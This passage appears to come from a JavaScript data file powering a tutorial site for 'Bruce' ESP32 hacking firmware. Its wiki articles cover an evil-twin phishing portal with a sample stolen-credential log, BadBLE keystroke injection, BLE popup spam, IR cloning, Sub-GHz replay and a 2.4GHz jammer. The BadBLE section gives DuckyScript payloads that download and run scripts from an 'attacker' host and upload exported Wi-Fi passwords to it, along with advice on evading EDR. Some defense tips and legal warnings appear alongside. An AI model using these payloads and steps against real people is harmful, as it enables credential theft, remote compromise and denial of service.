    &lt;meta name="viewport" content="width=device-width"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form method="POST" action="/capture"&gt;
        &lt;input name="email" placeholder="Email"&gt;
        &lt;input name="password" type="password"&gt;
        &lt;button type="submit"&gt;Sign In&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

                        <h3>Credential Log Format</h3>
                        <div class="code-block"># /SD/creds.txt
[2024-01-15 14:32:07] Portal: google
  Email: victim@example.com
  Password: Summer2024!
  User-Agent: iPhone Safari
  
[2024-01-15 14:35:22] Portal: starbucks
  Email: john.doe@company.com
  Password: P@ssw0rd123</div>

                        <h3>Real-World Scenarios</h3>
                        <table class="freq-table">
                            <tr><th>Scenario</th><th>SSID Example</th><th>Portal Type</th></tr>
                            <tr><td>Coffee Shop</td><td>Starbucks_Free_WiFi</td><td>Terms acceptance</td></tr>
                            <tr><td>Hotel Lobby</td><td>Marriott_Guest</td><td>Room number + name</td></tr>
                            <tr><td>Airport</td><td>Airport_Free_WiFi</td><td>Email registration</td></tr>
                            <tr><td>Corporate</td><td>Company_Visitor</td><td>AD credential prompt</td></tr>
                            <tr><td>Conference</td><td>DefCon_WiFi</td><td>Badge number entry</td></tr>
                        </table>

                        <div class="success-box">
                            <strong>Defense Tip:</strong> Train users to verify HTTPS certificates and use VPNs on public Wi-Fi. Implement 802.1X authentication for corporate networks to prevent evil twin attacks.
                        </div>
                    </article>`
            }
        ],
        ble: [
            {
                id: 'badble', title: "BadBLE", type: "attack", tag: "Injection",
                desc: "Wireless Bluetooth HID injection using DuckyScript payloads for keystroke attacks.",
                steps: ["Create Payload File", "Configure BLE Settings", "Advertise as Keyboard", "Wait for Pairing", "Execute Payload"],
                wiki: `
                    <article class="wiki-article">
                        <h2>BadBLE - Bluetooth HID Injection</h2>
                        
                        <p>BadBLE transforms the ESP32 into a wireless Rubber Ducky. It advertises as a Bluetooth keyboard, and once paired, executes pre-programmed keystroke sequences at superhuman speed.</p>

                        <h3>Attack Chain</h3>
                        <div class="attack-chain">
                            <span class="chain-node">Bruce Advertises</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node">Victim Pairs</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node">Trust Established</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node active">Payload Executes</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node">System Compromised</span>
                        </div>

                        <h3>Step-by-Step Execution</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Create DuckyScript Payload</div>
                                    <div class="step-desc">Write your payload using DuckyScript syntax. Save as <code>/SD/payloads/payload.txt</code>. Keep payloads under 4KB for reliable execution.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Configure Device Name</div>
                                    <div class="step-desc">Set a convincing Bluetooth name: "Logitech KB", "Apple Keyboard", "Meeting Room Display". Victims are more likely to pair with familiar-sounding devices.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Start Advertising</div>
                                    <div class="step-desc">Navigate to <strong>BLE ‚Üí BadBLE ‚Üí Start</strong>. Bruce begins advertising as a HID keyboard. Range is approximately 10 meters.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Wait for Pairing</div>
                                    <div class="step-desc">When victim pairs the device, the screen shows "Connected!". Payload execution begins automatically after a 500ms delay.</div>
                                </div>
                            </div>
                        </div>

                        <h3>DuckyScript Command Reference</h3>
                        <table class="freq-table">
                            <tr><th>Command</th><th>Description</th><th>Example</th></tr>
                            <tr><td>STRING</td><td>Type text</td><td>STRING Hello World</td></tr>
                            <tr><td>DELAY</td><td>Wait (ms)</td><td>DELAY 1000</td></tr>
                            <tr><td>ENTER</td><td>Press Enter</td><td>ENTER</td></tr>
                            <tr><td>GUI</td><td>Windows/Cmd key</td><td>GUI r</td></tr>
                            <tr><td>ALT</td><td>Alt key combo</td><td>ALT F4</td></tr>
                            <tr><td>CTRL</td><td>Ctrl key combo</td><td>CTRL ALT DELETE</td></tr>
                            <tr><td>TAB</td><td>Tab key</td><td>TAB</td></tr>
                            <tr><td>ESCAPE</td><td>Escape key</td><td>ESCAPE</td></tr>
                            <tr><td>REM</td><td>Comment</td><td>REM This is ignored</td></tr>
                        </table>

                        <h3>Example Payloads</h3>
                        <div class="code-block">REM === Windows Reverse Shell ===
DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')
ENTER</div>

                        <div class="code-block">REM === macOS Terminal Access ===
DELAY 500
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 500
STRING curl http://attacker/payload.sh | bash
ENTER</div>

                        <div class="code-block">REM === Exfiltrate Wi-Fi Passwords (Windows) ===
DELAY 500
GUI r
DELAY 200
STRING cmd /c "netsh wlan export profile key=clear folder=%TEMP% && curl -X POST -F file=@%TEMP%\\*.xml http://attacker/upload"
ENTER</div>

                        <h3>Specifications</h3>
                        <div class="spec-grid">
                            <div class="spec-item">
                                <div class="spec-label">BLE Version</div>
                                <div class="spec-value">5.0</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">HID Profile</div>
                                <div class="spec-value">HOGP</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">Range</div>
                                <div class="spec-value">~10m</div>
                            </div>
                            <div class="spec-item">
                                <div class="spec-label">Keystroke Speed</div>
                                <div class="spec-value">~100 char/s</div>
                            </div>
                        </div>

                        <div class="warning-box">
                            <strong>Detection:</strong> EDR solutions may flag rapid keystroke injection. Add realistic DELAY commands between actions to evade behavioral detection.
                        </div>
                    </article>`
            },
            {
                id: 'ble_spam', title: "BLE Spam", type: "attack", tag: "DoS",
                desc: "Floods nearby devices with fake pairing requests causing UI freezes and DoS.",
                steps: ["Select Target OS", "Choose Spam Type", "Configure Intensity", "Start Attack"],
                wiki: `
                    <article class="wiki-article">
                        <h2>BLE Advertisement Spam</h2>
                        
                        <p>Modern operating systems implement "proximity pairing" features that display popups when compatible Bluetooth devices are nearby. This attack exploits these features by broadcasting thousands of spoofed advertisements.</p>

                        <h3>Affected Systems</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">TARGET COMPATIBILITY MATRIX</span>

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ <span class="diagram-data">Operating System</span> ‚îÇ <span class="diagram-data">Feature Exploited</span> ‚îÇ <span class="diagram-data">Effect</span>          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ iOS 17+         ‚îÇ AirPods Popup    ‚îÇ Screen flood    ‚îÇ
‚îÇ iOS (all)       ‚îÇ AirDrop Spam     ‚îÇ Notification DoS‚îÇ
‚îÇ Android 6+      ‚îÇ Fast Pair        ‚îÇ Popup spam      ‚îÇ
‚îÇ Windows 10/11   ‚îÇ Swift Pair       ‚îÇ Toast flood     ‚îÇ
‚îÇ Samsung         ‚îÇ SmartThings      ‚îÇ Device popups   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            </pre>
                        </div>

                        <h3>Step-by-Step Execution</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Select Target Platform</div>
                                    <div class="step-desc">Choose the OS you want to target: <strong>Apple</strong> (AirPods/AirTag), <strong>Android</strong> (Fast Pair), <strong>Windows</strong> (Swift Pair), or <strong>All</strong> for maximum chaos.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Configure Spam Type</div>
                                    <div class="step-desc"><strong>Device Popups:</strong> Fake AirPods, Galaxy Buds. <strong>Transfer Requests:</strong> Fake AirDrop/Nearby Share. <strong>Tracker Alerts:</strong> Fake AirTag detection warnings.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Start Broadcasting</div>
                                    <div class="step-desc">Press START. Bruce cycles through spoofed device advertisements. Victims within 10m will see continuous popups, often freezing their UI.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Advertisement Types</h3>
                        <table class="freq-table">
                            <tr><th>Type</th><th>Target</th><th>Popup Message</th></tr>
                            <tr><td>AirPods Pro</td><td>iOS</td><td>"AirPods Pro nearby"</td></tr>
                            <tr><td>AirTag</td><td>iOS</td><td>"AirTag Found Moving With You"</td></tr>
                            <tr><td>Galaxy Buds</td><td>Android</td><td>"Galaxy Buds2 Pro available"</td></tr>
                            <tr><td>Xbox Controller</td><td>Windows</td><td>"Xbox Controller ready to pair"</td></tr>
                            <tr><td>Beats Solo</td><td>iOS/Android</td><td>"Beats Solo Pro nearby"</td></tr>
                        </table>

                        <h3>Performance Metrics</h3>
                        <div class="metric-row">
                            <div class="metric-card">
                                <div class="metric-value">~200</div>
                                <div class="metric-label">Packets/Second</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">10m</div>
                                <div class="metric-label">Effective Range</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">2-5s</div>
                                <div class="metric-label">Time to Effect</div>
                            </div>
                        </div>

                        <div class="info-box">
                            <strong>Mitigation:</strong> Disable "Fast Pair" on Android (Settings ‚Üí Google ‚Üí Devices), "Swift Pair" on Windows (Settings ‚Üí Bluetooth), or enable Airplane Mode to stop popups.
                        </div>
                    </article>`
            }
        ],
        ir: [
            {
                id: 'tvbgone', title: "TV-B-Gone", type: "util", tag: "Universal",
                desc: "Cycles through 200+ manufacturer power codes to turn off virtually any TV or display.",
                steps: ["Navigate to IR Module", "Select TV-B-Gone", "Point at Target", "Start Cycle", "Wait for Power Off"],
                wiki: `
                    <article class="wiki-article">
                        <h2>TV-B-Gone - Universal Power Control</h2>
                        
                        <p>Originally invented by Mitch Altman in 2004, TV-B-Gone iterates through a database of infrared power codes for hundreds of TV manufacturers. Bruce's implementation includes 230+ codes covering 95% of TVs worldwide.</p>

                        <h3>How It Works</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">IR TRANSMISSION SEQUENCE</span>

  Bruce IR LED                              Target TV
       ‚îÇ                                        ‚îÇ
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ Samsung Code ‚îÄ‚îÄ‚îÄ‚îÄ></span>              ‚îÇ ‚úó No match
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ LG Code ‚îÄ‚îÄ‚îÄ‚îÄ></span>                   ‚îÇ ‚úó No match
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ Sony Code ‚îÄ‚îÄ‚îÄ‚îÄ></span>                 ‚îÇ ‚úó No match
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ Vizio Code ‚îÄ‚îÄ‚îÄ‚îÄ></span>                ‚îÇ <span class="diagram-data">‚úì MATCH!</span>
       ‚îÇ                                        ‚îÇ
       ‚îÇ                                   [TV Powers Off]

<span class="diagram-label">TIMING: ~67ms per code √ó 230 codes = ~15 seconds full cycle</span>
                            </pre>
                        </div>

                        <h3>Step-by-Step Usage</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Position Device</div>
                                    <div class="step-desc">Point the IR LED (top edge of Cardputer) directly at the TV's IR receiver. Usually located near the power LED. Range: 1-3 meters, line of sight required.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Start Transmission</div>
                                    <div class="step-desc">Navigate to <strong>IR ‚Üí TV-B-Gone ‚Üí Start</strong>. The screen shows the current manufacturer being tried. Progress bar indicates cycle completion.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Wait for Match</div>
                                    <div class="step-desc">Keep pointing at the TV. Most TVs respond within 5-10 seconds. If no response after full cycle, try adjusting angle or moving closer.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Supported Manufacturers</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">Samsung</div><div class="spec-value">12 codes</div></div>
                            <div class="spec-item"><div class="spec-label">LG</div><div class="spec-value">8 codes</div></div>
                            <div class="spec-item"><div class="spec-label">Sony</div><div class="spec-value">10 codes</div></div>
                            <div class="spec-item"><div class="spec-label">Vizio</div><div class="spec-value">6 codes</div></div>
                            <div class="spec-item"><div class="spec-label">TCL/Roku</div><div class="spec-value">5 codes</div></div>
                            <div class="spec-item"><div class="spec-label">Hisense</div><div class="spec-value">4 codes</div></div>
                            <div class="spec-item"><div class="spec-label">Panasonic</div><div class="spec-value">7 codes</div></div>
                            <div class="spec-item"><div class="spec-label">Others</div><div class="spec-value">178 codes</div></div>
                        </div>

                        <h3>Technical Specifications</h3>
                        <div class="metric-row">
                            <div class="metric-card">
                                <div class="metric-value">38kHz</div>
                                <div class="metric-label">Carrier Freq</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">940nm</div>
                                <div class="metric-label">Wavelength</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">1-3m</div>
                                <div class="metric-label">Range</div>
                            </div>
                        </div>

                        <div class="info-box">
                            <strong>Pro Tip:</strong> For extended range, add an external IR LED to GPIO pin. With a proper driver circuit, range can extend to 10+ meters.
                        </div>
                    </article>`
            },
            {
                id: 'ir_learn', title: "IR Recorder", type: "util", tag: "Cloning",
                desc: "Capture, analyze, and replay infrared signals from any remote control.",
                steps: ["Enter Receive Mode", "Point Remote at Device", "Press Button to Capture", "Save Signal", "Replay Anytime"],
                wiki: `
                    <article class="wiki-article">
                        <h2>IR Signal Recording & Replay</h2>
                        
                        <p>The Cardputer's IR receiver can demodulate and record signals from virtually any infrared remote. Captured signals are stored in a universal format compatible with Flipper Zero and other tools.</p>

                        <h3>Signal Capture Process</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">IR DEMODULATION PIPELINE</span>

  Remote Control          Bruce IR Receiver          Storage
       ‚îÇ                        ‚îÇ                       ‚îÇ
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ 38kHz Modulated ‚îÄ‚îÄ></span> ‚îÇ                       ‚îÇ
       ‚îÇ     IR Signal          ‚îÇ                       ‚îÇ
       ‚îÇ                        ‚ñº                       ‚îÇ
       ‚îÇ                  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                  ‚îÇ
       ‚îÇ                  ‚îÇ<span class="diagram-data">Demodulate</span>‚îÇ                  ‚îÇ
       ‚îÇ                  ‚îÇ & Decode ‚îÇ                  ‚îÇ
       ‚îÇ                  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                  ‚îÇ
       ‚îÇ                       ‚îÇ                        ‚îÇ
       ‚îÇ                       ‚ñº                        ‚îÇ
       ‚îÇ                  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                  ‚îÇ
       ‚îÇ                  ‚îÇ <span class="diagram-data">Protocol</span> ‚îÇ                  ‚îÇ
       ‚îÇ                  ‚îÇ<span class="diagram-data">Detection</span>‚îÇ                  ‚îÇ
       ‚îÇ                  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                  ‚îÇ
       ‚îÇ                       ‚îÇ                        ‚îÇ
       ‚îÇ                       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ></span>‚îÇ
       ‚îÇ                         Save to SD             ‚îÇ
                            </pre>
                        </div>

                        <h3>Step-by-Step Recording</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Enter Receive Mode</div>
                                    <div class="step-desc">Navigate to <strong>IR ‚Üí Receive</strong>. The screen shows "Waiting for signal..." with a live signal strength indicator.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Capture Signal</div>
                                    <div class="step-desc">Point the remote at Bruce's IR receiver (top edge). Press the button you want to capture. Hold for 1 second. Screen shows "Signal captured!" with protocol info.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Review & Save</div>
                                    <div class="step-desc">Review detected protocol (NEC, RC5, Sony, etc.). Name the signal descriptively: "TV_Power", "AC_Cool_22C". Saved to <code>/SD/ir/[name].ir</code></div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Replay Signal</div>
                                    <div class="step-desc">Go to <strong>IR ‚Üí Transmit ‚Üí Select File</strong>. Point at target device and press ENTER. Signal replays exactly as captured.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Supported Protocols</h3>
                        <table class="freq-table">
                            <tr><th>Protocol</th><th>Carrier</th><th>Common Devices</th></tr>
                            <tr><td>NEC</td><td>38kHz</td><td>Most TVs, LED strips, fans</td></tr>
                            <tr><td>RC5</td><td>36kHz</td><td>Philips, older European TVs</td></tr>
                            <tr><td>RC6</td><td>36kHz</td><td>Microsoft MCE remotes</td></tr>
                            <tr><td>Sony SIRC</td><td>40kHz</td><td>Sony TVs, PlayStation</td></tr>
                            <tr><td>Samsung</td><td>38kHz</td><td>Samsung TVs, appliances</td></tr>
                            <tr><td>RAW</td><td>Variable</td><td>Unknown/proprietary</td></tr>
                        </table>

                        <h3>IR File Format</h3>
                        <div class="code-block"># /SD/ir/TV_Power.ir
Filetype: IR signals file
Version: 1
#
name: TV_Power
type: parsed
protocol: NEC
address: 04 00 00 00
command: 08 00 00 00</div>

                        <div class="code-block"># RAW capture (unknown protocol)
name: AC_Cool_22
type: raw
frequency: 38000
duty_cycle: 0.330000
data: 3000 1700 400 450 400 1300 400 450...</div>

                        <div class="success-box">
                            <strong>Real-World Use:</strong> Clone hotel TV remotes, backup your own remotes digitally, control devices with lost remotes, automate IR-controlled devices.
                        </div>
                    </article>`
            }
        ],
        rf: [
            {
                id: 'subghz', title: "Sub-GHz Radio", type: "recon", tag: "CC1101",
                desc: "Scan, capture, and replay signals on 300-928MHz for garage doors, gates, and IoT devices.",
                steps: ["Connect CC1101 Module", "Select Frequency Band", "Scan for Signals", "Capture Transmission", "Analyze & Replay"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Sub-GHz Radio Operations</h2>
                        
                        <div class="info-box">
                            <strong>Hardware Required:</strong> CC1101 transceiver module connected to Grove port. The ESP32's built-in radio only covers 2.4GHz - Sub-GHz requires external hardware.
                        </div>

                        <h3>Frequency Bands & Applications</h3>
                        <table class="freq-table">
                            <tr><th>Frequency</th><th>Region</th><th>Common Uses</th></tr>
                            <tr><td>315 MHz</td><td>North America</td><td>Older garage doors, car key fobs</td></tr>
                            <tr><td>433.92 MHz</td><td>Worldwide</td><td>Garage doors, weather stations, doorbells</td></tr>
                            <tr><td>868 MHz</td><td>Europe</td><td>Smart home, LoRa, alarms</td></tr>
                            <tr><td>915 MHz</td><td>Americas</td><td>LoRa, industrial IoT</td></tr>
                        </table>

                        <h3>CC1101 Wiring Diagram</h3>
                        <div class="pin-diagram">
                            <div class="pin-item"><div class="pin-name">VCC</div><div class="pin-func">3.3V Power</div></div>
                            <div class="pin-item"><div class="pin-name">GND</div><div class="pin-func">Ground</div></div>
                            <div class="pin-item"><div class="pin-name">CSN</div><div class="pin-func">GPIO 7</div></div>
                            <div class="pin-item"><div class="pin-name">SCK</div><div class="pin-func">GPIO 6</div></div>
                            <div class="pin-item"><div class="pin-name">MOSI</div><div class="pin-func">GPIO 5</div></div>
                            <div class="pin-item"><div class="pin-name">MISO</div><div class="pin-func">GPIO 4</div></div>
                            <div class="pin-item"><div class="pin-name">GDO0</div><div class="pin-func">GPIO 8</div></div>
                            <div class="pin-item"><div class="pin-name">GDO2</div><div class="pin-func">Optional</div></div>
                        </div>

                        <h3>Step-by-Step Signal Capture</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Connect Hardware</div>
                                    <div class="step-desc">Wire CC1101 to Grove port using jumper cables. Power off Bruce before connecting. Verify 3.3V connection (5V will damage the module).</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Select Frequency</div>
                                    <div class="step-desc">Navigate to <strong>RF ‚Üí Sub-GHz ‚Üí Frequency</strong>. Start with 433.92 MHz for most devices. Use "Hopper" mode to scan multiple frequencies automatically.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Capture Signal</div>
                                    <div class="step-desc">Press <strong>Receive</strong>. Trigger the target device (press garage remote, doorbell, etc.). Screen shows signal strength and modulation type when captured.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Analyze Protocol</div>
                                    <div class="step-desc">Bruce auto-detects common protocols: <strong>Princeton</strong>, <strong>CAME</strong>, <strong>Nice FLO</strong>, <strong>Linear</strong>. Unknown signals saved as RAW for manual analysis.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">5</div>
                                <div class="step-content">
                                    <div class="step-title">Replay Signal</div>
                                    <div class="step-desc">Go to <strong>RF ‚Üí Transmit</strong>. Select saved file. Point antenna toward target. Press ENTER to transmit. Works on fixed-code systems only.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Protocol Security Levels</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">SECURITY HIERARCHY</span>

<span class="diagram-data">VULNERABLE (Replay Works)</span>
‚îú‚îÄ‚îÄ Fixed Code (Princeton, PT2262)
‚îú‚îÄ‚îÄ Linear Delta 3 
‚îî‚îÄ‚îÄ CAME 12-bit

<span class="diagram-data">PARTIALLY SECURE (Rolling Code)</span>
‚îú‚îÄ‚îÄ KeeLoq (older implementations)
‚îú‚îÄ‚îÄ Nice SMILO
‚îî‚îÄ‚îÄ CAME TOP

<span class="diagram-arrow">SECURE (Replay Blocked)</span>
‚îú‚îÄ‚îÄ KeeLoq with seed
‚îú‚îÄ‚îÄ Chamberlain Security+ 2.0
‚îî‚îÄ‚îÄ Modern automotive (AES-128)
                            </pre>
                        </div>

                        <h3>Signal File Format</h3>
                        <div class="code-block"># /SD/subghz/garage_door.sub
Filetype: Flipper SubGhz RAW File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: Princeton
Bit: 24
Key: 00 AB CD EF</div>

                        <div class="warning-box">
                            <strong>Legal Notice:</strong> Transmitting on Sub-GHz frequencies may require amateur radio license. Replaying garage door signals you don't own is illegal. Rolling code systems (most modern openers) cannot be replayed.
                        </div>
                    </article>`
            },
            {
                id: 'jammer', title: "2.4GHz Jammer", type: "attack", tag: "NRF24",
                desc: "Disrupts 2.4GHz devices including wireless keyboards, mice, drones, and Zigbee.",
                steps: ["Connect NRF24L01+ Module", "Select Target Channel", "Configure Power Level", "Start Jamming", "Monitor Effect"],
                wiki: `
                    <article class="wiki-article">
                        <h2>2.4GHz Spectrum Jamming</h2>
                        
                        <div class="legal-notice">
                            <div class="legal-title">‚ö†Ô∏è EXTREMELY ILLEGAL</div>
                            <div class="legal-text">Radio jamming violates FCC Part 15 (US), Radio Equipment Directive (EU), and similar laws worldwide. Penalties include fines up to 100,000 USD per violation and imprisonment. Only use in RF-shielded environments (Faraday cage) for research purposes.</div>
                        </div>

                        <h3>Attack Mechanism</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">2.4GHz SPECTRUM JAMMING</span>

Channel:  1    6    11   WiFi Channels
          ‚îÇ    ‚îÇ    ‚îÇ
    2.400‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ2.483 GHz
          ‚îÇ    ‚îÇ    ‚îÇ
          ‚ñº    ‚ñº    ‚ñº
    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    ‚îÇ<span class="diagram-data">  NRF24 Noise Floor   </span>‚îÇ  ‚Üê Jammer floods
    ‚îÇ<span class="diagram-data">  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà </span>‚îÇ    all channels
    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

<span class="diagram-label">AFFECTED DEVICES:</span>
‚Ä¢ Wireless keyboards/mice (Logitech Unifying, etc.)
‚Ä¢ Bluetooth (partially - uses frequency hopping)
‚Ä¢ Zigbee smart home devices
‚Ä¢ 2.4GHz drones (control link)
‚Ä¢ Wireless cameras
‚Ä¢ Baby monitors
                            </pre>
                        </div>

                        <h3>NRF24L01+ Wiring</h3>
                        <div class="pin-diagram">
                            <div class="pin-item"><div class="pin-name">VCC</div><div class="pin-func">3.3V</div></div>
                            <div class="pin-item"><div class="pin-name">GND</div><div class="pin-func">Ground</div></div>
                            <div class="pin-item"><div class="pin-name">CE</div><div class="pin-func">GPIO 12</div></div>
                            <div class="pin-item"><div class="pin-name">CSN</div><div class="pin-func">GPIO 13</div></div>
                            <div class="pin-item"><div class="pin-name">SCK</div><div class="pin-func">GPIO 14</div></div>
                            <div class="pin-item"><div class="pin-name">MOSI</div><div class="pin-func">GPIO 15</div></div>
                            <div class="pin-item"><div class="pin-name">MISO</div><div class="pin-func">GPIO 16</div></div>
                            <div class="pin-item"><div class="pin-name">IRQ</div><div class="pin-func">Optional</div></div>
                        </div>

                        <h3>Step-by-Step Operation</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Connect NRF24L01+</div>
                                    <div class="step-desc">Wire module to SPI pins. Use the PA+LNA version for extended range. Add 10¬µF capacitor between VCC and GND for stability.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Select Jamming Mode</div>
                                    <div class="step-desc"><strong>Sweep:</strong> Cycles through all channels. <strong>Fixed:</strong> Target specific channel. <strong>Bluetooth:</strong> Optimized for BT frequency hopping pattern.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Start Transmission</div>
                                    <div class="step-desc">Press START. The module transmits continuous carrier or pseudo-random noise. Effective range: 10-50m depending on module variant.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Effectiveness Matrix</h3>
                        <table class="freq-table">
